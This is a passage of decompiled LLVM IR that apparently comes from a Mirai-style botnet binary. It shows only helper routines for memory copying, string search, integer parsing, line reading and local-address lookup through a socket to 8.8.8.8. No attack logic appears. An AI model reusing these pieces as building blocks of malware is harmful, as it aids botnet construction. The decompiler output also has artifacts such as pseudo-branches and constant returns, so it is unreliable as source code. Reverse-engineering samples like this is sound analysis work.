; uselistorder directives
  uselistorder i32 %v1_10009634, { 1, 0 }
  uselistorder i32 %v1_10009630, { 1, 0 }
  uselistorder i32 %v1_1000960c, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_10009628, { 1, 0 }
  uselistorder label %dec_label_pc_1000960c, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_10009640 = icmp eq i32 %arg3, 0
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v0_10009648 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009640, i32 %v0_10009648)
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009650

dec_label_pc_10009650:                            ; preds = %dec_label_pc_10009650, %entry
  %v0_10009650 = phi i32 [ %v1_10009658, %dec_label_pc_10009650 ], [ 0, %entry ]
  %v2_10009650 = add i32 %v0_10009650, %arg2
  %v3_10009650 = inttoptr i32 %v2_10009650 to i8*
  %v4_10009650 = load i8, i8* %v3_10009650, align 1
  %v4_10009654 = add i32 %v0_10009650, %arg1
  %v5_10009654 = inttoptr i32 %v4_10009654 to i8*
  store i8 %v4_10009650, i8* %v5_10009654, align 1
  %v0_10009658 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009658 = add i32 %v0_10009658, 1
  store i32 %v1_10009658, i32* %r9.global-to-local, align 4
  %v0_1000965c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000965c = add i32 %v0_1000965c, -1
  store i32 %v1_1000965c, i32* %ctr.global-to-local, align 4
  %v2_1000965c = icmp eq i32 %v1_1000965c, 0
  br i1 %v2_1000965c, label %dec_label_pc_10009660, label %dec_label_pc_10009650

dec_label_pc_10009660:                            ; preds = %dec_label_pc_10009650
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000965c, { 1, 0 }
  uselistorder i32 %v1_10009658, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10009664 = load i32, i32* @r4, align 4
  %v3_10009664 = icmp eq i32 %v0_10009664, 0
  store i32 %v0_10009664, i32* %ctr.global-to-local, align 4
  %v0_1000966c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009664, i32 %v0_1000966c)
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10009674

dec_label_pc_10009674:                            ; preds = %dec_label_pc_10009674, %entry
  %v1_10009678 = phi i32 [ %v1_1000967c, %dec_label_pc_10009674 ], [ 0, %entry ]
  %v2_10009678 = load i32, i32* @r3, align 4
  %v4_10009678 = add i32 %v2_10009678, %v1_10009678
  %v5_10009678 = inttoptr i32 %v4_10009678 to i8*
  store i8 0, i8* %v5_10009678, align 1
  %v0_1000967c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000967c = add i32 %v0_1000967c, 1
  store i32 %v1_1000967c, i32* %r9.global-to-local, align 4
  %v0_10009680 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009680 = add i32 %v0_10009680, -1
  store i32 %v1_10009680, i32* %ctr.global-to-local, align 4
  %v2_10009680 = icmp eq i32 %v1_10009680, 0
  br i1 %v2_10009680, label %dec_label_pc_10009684, label %dec_label_pc_10009674

dec_label_pc_10009684:                            ; preds = %dec_label_pc_10009674
  %v0_10009684 = load i32, i32* @r3, align 4
  ret i32 %v0_10009684

; uselistorder directives
  uselistorder i32 %v1_10009680, { 1, 0 }
  uselistorder i32 %v1_1000967c, { 1, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10009688 = icmp sgt i32 %arg4, %arg2
  br i1 %v3_10009688, label %dec_label_pc_10009694, label %dec_label_pc_1000969c

dec_label_pc_10009694:                            ; preds = %dec_label_pc_100096b8, %entry, %dec_label_pc_1000969c
  ret i32 -1

dec_label_pc_1000969c:                            ; preds = %entry
  %tmp = icmp slt i32 %arg2, 1
  br i1 %tmp, label %dec_label_pc_10009694, label %dec_label_pc_100096a4

dec_label_pc_100096a4:                            ; preds = %dec_label_pc_1000969c
  br label %dec_label_pc_100096c0

dec_label_pc_100096b4:                            ; preds = %dec_label_pc_100096c0
  br label %dec_label_pc_100096b8

dec_label_pc_100096b8:                            ; preds = %dec_label_pc_100096d0, %dec_label_pc_100096b4
  %v1_100096c02 = phi i32 [ %v1_100096d0, %dec_label_pc_100096d0 ], [ 0, %dec_label_pc_100096b4 ]
  %v1_100096b8 = add i32 %v0_100096dc, 1
  %v1_100096bc = add i32 %v0_100096bc, -1
  %v2_100096bc = icmp eq i32 %v1_100096bc, 0
  br i1 %v2_100096bc, label %dec_label_pc_10009694, label %dec_label_pc_100096c0

dec_label_pc_100096c0:                            ; preds = %dec_label_pc_100096b8, %dec_label_pc_100096a4
  %v0_100096bc = phi i32 [ %v1_100096bc, %dec_label_pc_100096b8 ], [ %arg2, %dec_label_pc_100096a4 ]
  %v0_100096dc = phi i32 [ %v1_100096b8, %dec_label_pc_100096b8 ], [ 0, %dec_label_pc_100096a4 ]
  %v0_100096d0 = phi i32 [ %v1_100096c02, %dec_label_pc_100096b8 ], [ 0, %dec_label_pc_100096a4 ]
  %v2_100096c0 = add i32 %v0_100096d0, %arg3
  %v3_100096c0 = inttoptr i32 %v2_100096c0 to i8*
  %v4_100096c0 = load i8, i8* %v3_100096c0, align 1
  %v2_100096c4 = add i32 %v0_100096dc, %arg1
  %v3_100096c4 = inttoptr i32 %v2_100096c4 to i8*
  %v4_100096c4 = load i8, i8* %v3_100096c4, align 1
  %v4_100096c8 = icmp eq i8 %v4_100096c4, %v4_100096c0
  br i1 %v4_100096c8, label %dec_label_pc_100096d0, label %dec_label_pc_100096b4

dec_label_pc_100096d0:                            ; preds = %dec_label_pc_100096c0
  %v1_100096d0 = add i32 %v0_100096d0, 1
  %v4_100096d4 = icmp eq i32 %v1_100096d0, %arg4
  br i1 %v4_100096d4, label %dec_label_pc_100096dc, label %dec_label_pc_100096b8

dec_label_pc_100096dc:                            ; preds = %dec_label_pc_100096d0
  %v1_100096dc = add i32 %v0_100096dc, 1
  ret i32 %v1_100096dc

; uselistorder directives
  uselistorder i32 %v1_100096d0, { 1, 0 }
  uselistorder i32 %v0_100096d0, { 1, 0 }
  uselistorder label %dec_label_pc_10009694, { 0, 2, 1 }
}

define i32 @util_atoi(i32 %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %r5.global-to-local = alloca i32, align 4
  %v0_100096e4.pre = load i32, i32* @r3, align 4
  br label %entry

entry:                                            ; preds = %entry, %entry, %entry, %bb
  %v0_100096e4 = phi i32 [ %v0_100096e4.pre, %bb ], [ %v1_100096e8, %entry ], [ %v1_100096e8, %entry ], [ %v1_100096e8, %entry ]
  %v1_100096e4 = inttoptr i32 %v0_100096e4 to i8*
  %v2_100096e4 = load i8, i8* %v1_100096e4, align 1
  %v3_100096e4 = zext i8 %v2_100096e4 to i32
  %v1_100096e8 = add i32 %v0_100096e4, 1
  store i32 %v3_100096e4, i32* @r8, align 4
  switch i8 %v2_100096e4, label %dec_label_pc_10009708 [
    i8 32, label %entry
    i8 10, label %entry
    i8 9, label %entry
  ]

dec_label_pc_10009708:                            ; preds = %entry
  %v3_10009708 = icmp eq i8 %v2_100096e4, 45
  br i1 %v3_10009708, label %dec_label_pc_100097b4, label %dec_label_pc_10009710

dec_label_pc_10009710:                            ; preds = %dec_label_pc_10009708
  %v3_10009710 = icmp eq i8 %v2_100096e4, 43
  br i1 %v3_10009710, label %dec_label_pc_1000980c, label %dec_label_pc_10009718

dec_label_pc_10009718:                            ; preds = %dec_label_pc_10009710, %dec_label_pc_1000980c
  %v0_100097a826 = phi i32 [ %v1_100096e8, %dec_label_pc_10009710 ], [ %v1_10009810, %dec_label_pc_1000980c ]
  %v0_100097385 = phi i32 [ %v3_100096e4, %dec_label_pc_10009710 ], [ %v3_1000980c, %dec_label_pc_1000980c ]
  br label %dec_label_pc_10009724

dec_label_pc_10009724:                            ; preds = %dec_label_pc_100097b4, %dec_label_pc_10009718
  %v0_100097a825 = phi i32 [ %v1_100097bc, %dec_label_pc_100097b4 ], [ %v0_100097a826, %dec_label_pc_10009718 ]
  %v0_100097384 = phi i32 [ %v3_100097b4, %dec_label_pc_100097b4 ], [ %v0_100097385, %dec_label_pc_10009718 ]
  %v0_100097fc = phi i32 [ 1, %dec_label_pc_100097b4 ], [ 0, %dec_label_pc_10009718 ]
  %v1_10009734 = phi i32 [ -2147483648, %dec_label_pc_100097b4 ], [ 2147483647, %dec_label_pc_10009718 ]
  %v2_10009724 = udiv i32 %v1_10009734, %arg1
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_10009730 = mul i32 %v2_10009724, %arg1
  %v2_10009734 = sub i32 %v1_10009734, %v2_10009730
  br label %dec_label_pc_10009738

dec_label_pc_10009738:                            ; preds = %dec_label_pc_100097a8, %dec_label_pc_10009724
  %v0_100097a8 = phi i32 [ %v1_100097ac, %dec_label_pc_100097a8 ], [ %v0_100097a825, %dec_label_pc_10009724 ]
  %v0_1000979c = phi i32 [ %v0_1000979417, %dec_label_pc_100097a8 ], [ 0, %dec_label_pc_10009724 ]
  %v0_1000978c = phi i32 [ %v0_100097ec11, %dec_label_pc_100097a8 ], [ 0, %dec_label_pc_10009724 ]
  %v0_10009784 = phi i32 [ %v0_100097e09, %dec_label_pc_100097a8 ], [ 0, %dec_label_pc_10009724 ]
  %v1_10009778 = phi i32 [ %v3_100097a8, %dec_label_pc_100097a8 ], [ %v0_100097384, %dec_label_pc_10009724 ]
  %v1_1000973c = add nsw i32 %v1_10009778, -48
  %fold = add nsw i32 %v1_10009778, 208
  %v1_10009744 = urem i32 %fold, 256
  %tmp = icmp ult i32 %v1_10009744, 10
  br i1 %tmp, label %dec_label_pc_1000977c, label %dec_label_pc_10009750

dec_label_pc_10009750:                            ; preds = %dec_label_pc_10009738
  %v1_10009750 = add nsw i32 %v1_10009778, 191
  %v1_10009754 = urem i32 %v1_10009750, 256
  %tmp28 = icmp ult i32 %v1_10009754, 26
  br i1 %tmp28, label %dec_label_pc_10009778, label %dec_label_pc_10009764

dec_label_pc_10009764:                            ; preds = %dec_label_pc_10009750
  %v1_10009764 = add nsw i32 %v1_10009778, 159
  %v1_10009768 = urem i32 %v1_10009764, 256
  %v2_1000976c = icmp ugt i32 %v1_10009768, 25
  br i1 %v2_1000976c, label %dec_label_pc_100097e0, label %dec_label_pc_10009774

dec_label_pc_10009774:                            ; preds = %dec_label_pc_10009764
  br label %dec_label_pc_10009778

dec_label_pc_10009778:                            ; preds = %dec_label_pc_10009750, %dec_label_pc_10009774
  %v0_10009778 = phi i32 [ 55, %dec_label_pc_10009750 ], [ 87, %dec_label_pc_10009774 ]
  %v2_10009778 = sub nsw i32 %v1_10009778, %v0_10009778
  br label %dec_label_pc_1000977c

dec_label_pc_1000977c:                            ; preds = %dec_label_pc_10009738, %dec_label_pc_10009778
  %v0_100097a4 = phi i32 [ %v1_1000973c, %dec_label_pc_10009738 ], [ %v2_10009778, %dec_label_pc_10009778 ]
  %v2_1000977c = icmp slt i32 %v0_100097a4, %arg1
  br i1 %v2_1000977c, label %dec_label_pc_10009784, label %dec_label_pc_100097e0

dec_label_pc_10009784:                            ; preds = %dec_label_pc_1000977c
  %v1_10009784 = icmp slt i32 %v0_10009784, 0
  br i1 %v1_10009784, label %dec_label_pc_100097c8, label %dec_label_pc_1000978c

dec_label_pc_1000978c:                            ; preds = %dec_label_pc_10009784
  %v3_1000978c = icmp ugt i32 %v0_1000978c, %v2_10009724
  br i1 %v3_1000978c, label %dec_label_pc_100097c8, label %dec_label_pc_10009794

dec_label_pc_10009794:                            ; preds = %dec_label_pc_1000978c
  %v4_10009794 = icmp eq i32 %v0_1000979c, %v2_10009724
  br i1 %v4_10009794, label %dec_label_pc_100097d0, label %dec_label_pc_1000979c

dec_label_pc_1000979c:                            ; preds = %dec_label_pc_100097d0, %dec_label_pc_10009794
  %v2_1000979c = mul i32 %v0_1000979c, %arg1
  %v2_100097a4 = add i32 %v0_100097a4, %v2_1000979c
  store i32 %v2_100097a4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100097a8

dec_label_pc_100097a8:                            ; preds = %dec_label_pc_100097d0, %dec_label_pc_100097c8, %dec_label_pc_1000979c
  %v0_1000979417 = phi i32 [ %v2_10009724, %dec_label_pc_100097d0 ], [ %v0_1000979c, %dec_label_pc_100097c8 ], [ %v2_100097a4, %dec_label_pc_1000979c ]
  %v0_100097ec11 = phi i32 [ %v2_10009724, %dec_label_pc_100097d0 ], [ %v0_1000978c, %dec_label_pc_100097c8 ], [ %v2_100097a4, %dec_label_pc_1000979c ]
  %v0_100097e09 = phi i32 [ -1, %dec_label_pc_100097d0 ], [ -1, %dec_label_pc_100097c8 ], [ 1, %dec_label_pc_1000979c ]
  %v1_100097a8 = inttoptr i32 %v0_100097a8 to i8*
  %v2_100097a8 = load i8, i8* %v1_100097a8, align 1
  %v3_100097a8 = zext i8 %v2_100097a8 to i32
  store i32 %v3_100097a8, i32* @r8, align 4
  %v1_100097ac = add i32 %v0_100097a8, 1
  br label %dec_label_pc_10009738

dec_label_pc_100097b4:                            ; preds = %dec_label_pc_10009708
  %v1_100097b4 = inttoptr i32 %v1_100096e8 to i8*
  %v2_100097b4 = load i8, i8* %v1_100097b4, align 1
  %v3_100097b4 = zext i8 %v2_100097b4 to i32
  store i32 %v3_100097b4, i32* @r8, align 4
  %v1_100097bc = add i32 %v0_100096e4, 2
  br label %dec_label_pc_10009724

dec_label_pc_100097c8:                            ; preds = %dec_label_pc_1000978c, %dec_label_pc_10009784
  br label %dec_label_pc_100097a8

dec_label_pc_100097d0:                            ; preds = %dec_label_pc_10009794
  %v3_100097d0 = icmp sgt i32 %v0_100097a4, %v2_10009734
  br i1 %v3_100097d0, label %dec_label_pc_100097a8, label %dec_label_pc_1000979c

dec_label_pc_100097e0:                            ; preds = %dec_label_pc_1000977c, %dec_label_pc_10009764
  %v1_100097e0 = icmp slt i32 %v0_10009784, 0
  br i1 %v1_100097e0, label %dec_label_pc_100097fc, label %dec_label_pc_100097e8

dec_label_pc_100097e8:                            ; preds = %dec_label_pc_100097e0
  %v3_100097e8 = icmp eq i32 %v0_100097fc, 0
  %v0_100097f0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100097e8, i32 %v0_100097f0)
  %v0_100097f4 = load i32, i32* %r5.global-to-local, align 4
  %v1_100097f4 = sub i32 0, %v0_100097f4
  ret i32 %v1_100097f4

dec_label_pc_100097fc:                            ; preds = %dec_label_pc_100097e0
  %v1_100097fc = xor i32 %v0_100097fc, 1
  %v2_10009804 = sub nuw i32 -2147483648, %v1_100097fc
  ret i32 %v2_10009804

dec_label_pc_1000980c:                            ; preds = %dec_label_pc_10009710
  %v1_1000980c = inttoptr i32 %v1_100096e8 to i8*
  %v2_1000980c = load i8, i8* %v1_1000980c, align 1
  %v3_1000980c = zext i8 %v2_1000980c to i32
  store i32 %v3_1000980c, i32* @r8, align 4
  %v1_10009810 = add i32 %v0_100096e4, 2
  br label %dec_label_pc_10009718

; uselistorder directives
  uselistorder i32 %v3_1000980c, { 1, 0 }
  uselistorder i32 %v3_100097b4, { 1, 0 }
  uselistorder i32 %v3_100097a8, { 1, 0 }
  uselistorder i32 %v2_100097a4, { 1, 0, 2 }
  uselistorder i32 %v0_100097a4, { 1, 0, 2 }
  uselistorder i32 %v1_10009778, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_1000979c, { 2, 0, 1 }
  uselistorder i32 %v0_100097a8, { 1, 0 }
  uselistorder i32 %v2_10009724, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_100096e8, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_100096e4, { 1, 0, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 208, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 32, { 0, 2, 3, 4, 5, 6, 7, 1, 9, 10, 11, 12, 13, 14, 8, 15, 16, 17, 18 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000977c, { 1, 0 }
  uselistorder label %dec_label_pc_10009778, { 1, 0 }
  uselistorder label %dec_label_pc_10009718, { 1, 0 }
  uselistorder label %entry, { 2, 1, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r27.global-to-local, align 4
  store i32 %tmp, i32* %r28.global-to-local, align 4
  store i32 %arg3, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v1_1000985813 = call i32 @__libc_read(i32 %arg3)
  %v3_1000985c16 = icmp eq i32 %v1_1000985813, 1
  br i1 %v3_1000985c16, label %dec_label_pc_10009864, label %dec_label_pc_10009880

dec_label_pc_10009864:                            ; preds = %entry, %dec_label_pc_10009870.dec_label_pc_1000984c_crit_edge
  %v0_1000986418 = phi i32 [ %v0_10009864, %dec_label_pc_10009870.dec_label_pc_1000984c_crit_edge ], [ 0, %entry ]
  %v1_10009864 = add i32 %v0_1000986418, 1
  store i32 %v1_10009864, i32* %r30.global-to-local, align 4
  %v1_10009868 = load i32, i32* %r27.global-to-local, align 4
  %v2_10009868 = icmp slt i32 %v1_10009864, %v1_10009868
  br i1 %v2_10009868, label %dec_label_pc_10009870, label %dec_label_pc_10009894.loopexit

dec_label_pc_10009870:                            ; preds = %dec_label_pc_10009864
  %v0_10009870 = load i32, i32* %r31.global-to-local, align 4
  %v1_10009870 = inttoptr i32 %v0_10009870 to i8*
  %v2_10009870 = load i8, i8* %v1_10009870, align 1
  %v1_10009874 = add i32 %v0_10009870, 1
  store i32 %v1_10009874, i32* %r31.global-to-local, align 4
  %v3_10009878 = icmp eq i8 %v2_10009870, 10
  br i1 %v3_10009878, label %dec_label_pc_10009880, label %dec_label_pc_10009870.dec_label_pc_1000984c_crit_edge

dec_label_pc_10009870.dec_label_pc_1000984c_crit_edge: ; preds = %dec_label_pc_10009870
  %v0_10009850.pre = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10009850.pre, i32* @r3, align 4
  %v1_10009858 = call i32 @__libc_read(i32 %v0_10009850.pre)
  %v3_1000985c = icmp eq i32 %v1_10009858, 1
  %v0_10009864 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_1000985c, label %dec_label_pc_10009864, label %dec_label_pc_10009880

dec_label_pc_10009880:                            ; preds = %dec_label_pc_10009870, %dec_label_pc_10009870.dec_label_pc_1000984c_crit_edge, %entry
  %v0_10009880 = phi i32 [ 0, %entry ], [ %v0_10009864, %dec_label_pc_10009870.dec_label_pc_1000984c_crit_edge ], [ %v1_10009864, %dec_label_pc_10009870 ]
  %tmp22 = icmp slt i32 %v0_10009880, 0
  %v1_10009880 = zext i1 %tmp22 to i32
  %v2_10009880 = ashr i32 %v0_10009880, 31
  %v3_10009880 = and i32 %v2_10009880, -2
  %v4_10009880 = or i32 %v3_10009880, %v1_10009880
  %v2_10009884 = xor i32 %v4_10009880, %v0_10009880
  %v2_10009888 = sub i32 %v4_10009880, %v2_10009884
  %tmp23 = icmp slt i32 %v2_10009888, 0
  %v1_1000988c = zext i1 %tmp23 to i32
  %v2_1000988c = ashr i32 %v2_10009888, 31
  %v3_1000988c = and i32 %v2_1000988c, -2
  %v4_1000988c = or i32 %v3_1000988c, %v1_1000988c
  %v0_10009890 = load i32, i32* %r28.global-to-local, align 4
  %v2_10009890 = and i32 %v4_1000988c, %v0_10009890
  store i32 %v2_10009890, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10009894

dec_label_pc_10009894.loopexit:                   ; preds = %dec_label_pc_10009864
  %v0_10009898.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10009894

dec_label_pc_10009894:                            ; preds = %dec_label_pc_10009894.loopexit, %dec_label_pc_10009880
  %v0_10009898 = phi i32 [ %v0_10009898.pre, %dec_label_pc_10009894.loopexit ], [ %v2_10009890, %dec_label_pc_10009880 ]
  ret i32 %v0_10009898

; uselistorder directives
  uselistorder i32 %v2_10009888, { 1, 0 }
  uselistorder i32 %v4_10009880, { 1, 0 }
  uselistorder i32 %v0_10009880, { 1, 2, 0 }
  uselistorder i32* %r28.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10009880, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009864, { 1, 0 }
}

define i32 @util_local_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  store i32 16, i32* %stack_var_-56, align 4
  %v0_100098d8 = call i32 @__GI___errno_location()
  %v2_100098e4 = inttoptr i32 %v0_100098d8 to i32*
  store i32 0, i32* %v2_100098e4, align 4
  store i32 ptrtoint (i32* @global_var_100098f4.470 to i32), i32* @lr, align 4
  %v3_100098f0 = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_100098f8 = icmp eq i32 %v3_100098f0, -1
  br i1 %v3_100098f8, label %dec_label_pc_1000994c, label %dec_label_pc_10009904

dec_label_pc_10009904:                            ; preds = %entry
  %v2_10009904 = ptrtoint i32* %stack_var_-52 to i32
  store i32 2, i32* %stack_var_-52, align 4
  store i32 268474672, i32* @lr, align 4
  %v3_1000992c = call i32 @__libc_connect(i32 %v2_10009904, i32 16, i32 16)
  %v2_10009934 = ptrtoint i32* %stack_var_-56 to i32
  %v0_10009938 = load i32, i32* @r31, align 4
  store i32 268474688, i32* @lr, align 4
  %v3_1000993c = call i32 @__GI_getsockname(i32 %v0_10009938, i32 %v2_10009904, i32 %v2_10009934)
  %v0_10009940 = load i32, i32* @r31, align 4
  store i32 %v0_10009940, i32* @r3, align 4
  %v0_10009944 = call i32 @__GI___libc_close()
  br label %dec_label_pc_1000994c

dec_label_pc_1000994c:                            ; preds = %entry, %dec_label_pc_10009904
  %v0_1000994c = phi i32 [ 0, %entry ], [ 134744072, %dec_label_pc_10009904 ]
  ret i32 %v0_1000994c

; uselistorder directives
  uselistorder i32 %v2_10009904, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 17, 18, 15, 16, 14, 3, 2, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 1 }
  uselistorder label %dec_label_pc_1000994c, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp15 = ptrtoint i8* %arg1 to i32
  %v3_10009968 = load i8, i8* %tmp, align 1
  store i32 0, i32* @r8, align 4
  %v3_10009974 = icmp eq i8 %v3_10009968, 0
  br i1 %v3_10009974, label %dec_label_pc_1000998c, label %dec_label_pc_1000997c

dec_label_pc_1000997c:                            ; preds = %entry, %dec_label_pc_1000997c
  %v0_1000997c = phi i32 [ %v1_1000997c, %dec_label_pc_1000997c ], [ 0, %entry ]
  %v1_1000997c = add i32 %v0_1000997c, 1
  store i32 %v1_1000997c, i32* @r8, align 4
  %v3_10009980 = add i32 %v1_1000997c, %arg3
  %v4_10009980 = inttoptr i32 %v3_10009980 to i8*
  %v5_10009980 = load i8, i8* %v4_10009980, align 1
  %v3_10009984 = icmp eq i8 %v5_10009980, 0
  br i1 %v3_10009984, label %dec_label_pc_1000998c, label %dec_label_pc_1000997c

dec_label_pc_1000998c:                            ; preds = %dec_label_pc_1000997c, %entry
  %v0_100099f814 = phi i32 [ 0, %entry ], [ %v1_1000997c, %dec_label_pc_1000997c ]
  %v1_1000998c = icmp slt i32 %arg2, 0
  %v1_10009990 = add i32 %arg2, 1
  br i1 %v1_1000998c, label %dec_label_pc_10009a08, label %dec_label_pc_100099a4

dec_label_pc_100099a4:                            ; preds = %dec_label_pc_1000998c, %dec_label_pc_10009a08, %dec_label_pc_100099f4
  %v2_100099b09 = phi i32 [ %v1_100099f4, %dec_label_pc_100099f4 ], [ 0, %dec_label_pc_10009a08 ], [ 0, %dec_label_pc_1000998c ]
  %v0_100099a86 = phi i32 [ %v1_100099ac, %dec_label_pc_100099f4 ], [ %tmp15, %dec_label_pc_10009a08 ], [ %tmp15, %dec_label_pc_1000998c ]
  %v0_100099a4 = phi i32 [ %v0_100099e8, %dec_label_pc_100099f4 ], [ 1, %dec_label_pc_10009a08 ], [ %v1_10009990, %dec_label_pc_1000998c ]
  %v1_100099a4 = add i32 %v0_100099a4, -1
  %v2_100099a4 = icmp eq i32 %v1_100099a4, 0
  br i1 %v2_100099a4, label %dec_label_pc_100099ec, label %dec_label_pc_100099a8

dec_label_pc_100099a8:                            ; preds = %dec_label_pc_100099a4, %dec_label_pc_100099e4
  %v0_100099f4 = phi i32 [ 0, %dec_label_pc_100099e4 ], [ %v2_100099b09, %dec_label_pc_100099a4 ]
  %v0_100099a8 = phi i32 [ %v1_100099ac, %dec_label_pc_100099e4 ], [ %v0_100099a86, %dec_label_pc_100099a4 ]
  %v0_100099e8 = phi i32 [ %v1_100099e8, %dec_label_pc_100099e4 ], [ %v1_100099a4, %dec_label_pc_100099a4 ]
  %v1_100099a8 = inttoptr i32 %v0_100099a8 to i8*
  %v2_100099a8 = load i8, i8* %v1_100099a8, align 1
  %v3_100099a8 = zext i8 %v2_100099a8 to i32
  %v1_100099ac = add i32 %v0_100099a8, 1
  %v3_100099b0 = add i32 %v0_100099f4, %arg3
  %v4_100099b0 = inttoptr i32 %v3_100099b0 to i8*
  %v5_100099b0 = load i8, i8* %v4_100099b0, align 1
  %v6_100099b0 = zext i8 %v5_100099b0 to i32
  %v1_100099b4 = add nuw nsw i32 %v3_100099a8, 191
  %v1_100099b8 = urem i32 %v1_100099b4, 256
  %v2_100099bc = icmp ugt i32 %v1_100099b8, 25
  %v1_100099c0 = add nuw nsw i32 %v6_100099b0, 191
  %v1_100099c4 = urem i32 %v1_100099c0, 256
  %v2_100099c8 = icmp ugt i32 %v1_100099c4, 25
  br i1 %v2_100099bc, label %dec_label_pc_100099d4, label %dec_label_pc_100099d0

dec_label_pc_100099d0:                            ; preds = %dec_label_pc_100099a8
  %v1_100099d0 = or i32 %v3_100099a8, 96
  br i1 %v2_100099c8, label %dec_label_pc_100099dc, label %dec_label_pc_100099d8

dec_label_pc_100099d4:                            ; preds = %dec_label_pc_100099a8
  br i1 %v2_100099c8, label %dec_label_pc_100099dc, label %dec_label_pc_100099d8

dec_label_pc_100099d8:                            ; preds = %dec_label_pc_100099d0, %dec_label_pc_100099d4
  %v0_100099dc10 = phi i32 [ %v1_100099d0, %dec_label_pc_100099d0 ], [ %v3_100099a8, %dec_label_pc_100099d4 ]
  %v1_100099d8 = or i32 %v6_100099b0, 96
  br label %dec_label_pc_100099dc

dec_label_pc_100099dc:                            ; preds = %dec_label_pc_100099d0, %dec_label_pc_100099d4, %dec_label_pc_100099d8
  %v1_100099dc = phi i32 [ %v6_100099b0, %dec_label_pc_100099d0 ], [ %v6_100099b0, %dec_label_pc_100099d4 ], [ %v1_100099d8, %dec_label_pc_100099d8 ]
  %v0_100099dc = phi i32 [ %v1_100099d0, %dec_label_pc_100099d0 ], [ %v3_100099a8, %dec_label_pc_100099d4 ], [ %v0_100099dc10, %dec_label_pc_100099d8 ]
  %v4_100099dc = icmp eq i32 %v0_100099dc, %v1_100099dc
  br i1 %v4_100099dc, label %dec_label_pc_100099f4, label %dec_label_pc_100099e4

dec_label_pc_100099e4:                            ; preds = %dec_label_pc_100099dc
  %v1_100099e8 = add i32 %v0_100099e8, -1
  %v2_100099e8 = icmp eq i32 %v1_100099e8, 0
  br i1 %v2_100099e8, label %dec_label_pc_100099ec, label %dec_label_pc_100099a8

dec_label_pc_100099ec:                            ; preds = %dec_label_pc_100099a4, %dec_label_pc_100099e4
  ret i32 -1

dec_label_pc_100099f4:                            ; preds = %dec_label_pc_100099dc
  %v1_100099f4 = add i32 %v0_100099f4, 1
  %v4_100099f8 = icmp eq i32 %v0_100099f814, %v1_100099f4
  br i1 %v4_100099f8, label %dec_label_pc_10009a00, label %dec_label_pc_100099a4

dec_label_pc_10009a00:                            ; preds = %dec_label_pc_100099f4
  %v2_10009a00 = sub i32 %v1_100099ac, %tmp15
  ret i32 %v2_10009a00

dec_label_pc_10009a08:                            ; preds = %dec_label_pc_1000998c
  br label %dec_label_pc_100099a4

; uselistorder directives
  uselistorder i32 %v1_100099f4, { 1, 0 }
  uselistorder i32 %v1_100099e8, { 1, 0 }
  uselistorder i32 %v1_100099d0, { 1, 0 }
  uselistorder i1 %v2_100099c8, { 1, 0 }
  uselistorder i32 %v3_100099a8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100099e8, { 1, 0 }
  uselistorder i32 %v0_100099a8, { 1, 0 }
